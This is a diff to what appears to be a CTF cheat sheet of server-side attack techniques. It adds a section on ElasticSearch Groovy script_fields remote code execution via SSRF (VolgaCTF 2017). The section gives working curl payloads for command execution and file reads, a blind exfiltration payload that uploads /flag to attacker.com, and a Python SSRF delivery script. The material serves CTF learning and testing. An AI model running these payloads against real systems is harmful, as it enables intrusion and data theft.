@@ -15,6 +15,7 @@
 - [Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
 - [SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
 - [LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
+- [ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)](#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)
 
 See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, XXE external DTD, WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE).
 
@@ -434,3 +435,55 @@ beginfig(1); endfig; end;
 ```
 
 **Key insight:** `mpost` is whitelisted by restricted `write18` because it's needed for MetaPost diagrams. But its `-tex` flag allows specifying an arbitrary program as the "TeX processor," including `bash`. This transforms a restricted shell escape into full RCE. `${IFS}` replaces spaces to work within the quoted argument.
+
+---
+
+## ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)
+
+**Pattern:** When SSRF reaches an internal ElasticSearch instance (default port 9200), Groovy scripting in `script_fields` enables remote code execution. ElasticSearch versions before 5.0 allowed inline Groovy scripts by default.
+
+```bash
+# SSRF payload to ElasticSearch internal API
+curl 'http://localhost:9200/_search' -d '{
+  "script_fields": {
+    "exec": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
+    }
+  }
+}'
+
+# Read a specific file
+curl 'http://localhost:9200/_search' -d '{
+  "script_fields": {
+    "read": {
+      "script": "new java.io.File(\"/flag.txt\").text"
+    }
+  }
+}'
+
+# For blind RCE, exfiltrate via curl upload
+curl 'http://localhost:9200/_search' -d '{
+  "script_fields": {
+    "exfil": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl --upload-file /flag attacker.com:4042\").getText()"
+    }
+  }
+}'
+```
+
+**Via SSRF (URL-encoded for GET parameter):**
+```python
+import requests
+import urllib.parse
+
+es_payload = '{"script_fields":{"exec":{"script":"new java.io.File(\\"/flag.txt\\").text"}}}'
+ssrf_url = f"http://localhost:9200/_search?source={urllib.parse.quote(es_payload)}&source_content_type=application/json"
+
+# Through SSRF endpoint
+r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
+print(r.text)
+```
+
+**Detection:** SSRF vulnerability + internal service on port 9200. Confirm with `http://localhost:9200/` (returns ES version info) or `http://localhost:9200/_cat/indices` (lists indices).
+
+**Key insight:** ElasticSearch pre-5.0 exposed Groovy scripting via the `_search` API. Even without direct access, SSRF to port 9200 enables full RCE through `script_fields`. Modern ES versions disabled inline scripting by default. When testing SSRF, always probe port 9200 -- ElasticSearch is a common internal service with powerful script execution capabilities.
